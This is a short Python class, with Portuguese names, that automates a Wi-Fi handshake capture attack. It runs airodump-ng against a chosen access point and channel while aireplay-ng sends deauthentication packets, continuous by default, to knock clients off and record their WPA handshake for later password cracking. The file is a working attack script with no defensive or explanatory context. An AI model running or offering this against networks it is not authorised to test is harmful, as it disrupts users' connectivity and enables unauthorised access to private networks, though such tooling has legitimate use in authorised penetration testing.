import subprocess

class CapturadorHandshake:
    def __init__(self, interface, bssid, canal, arquivo_saida):
        self.interface = interface
        self.bssid = bssid
        self.canal = canal
        self.arquivo = arquivo_saida

    def capturar(self, pacotes=0):
        try:
            processo_captura = subprocess.Popen(
                ['sudo', 'airodump-ng', '--bssid', self.bssid, '-c', str(self.canal), '-w', self.arquivo, self.interface]
            )
            
            subprocess.run(
                ['sudo', 'aireplay-ng', '-0', str(pacotes), '-a', self.bssid, self.interface],
                timeout=300
            )
            
            processo_captura.terminate()
            return True
        except (subprocess.CalledProcessError, subprocess.TimeoutExpired):
            return False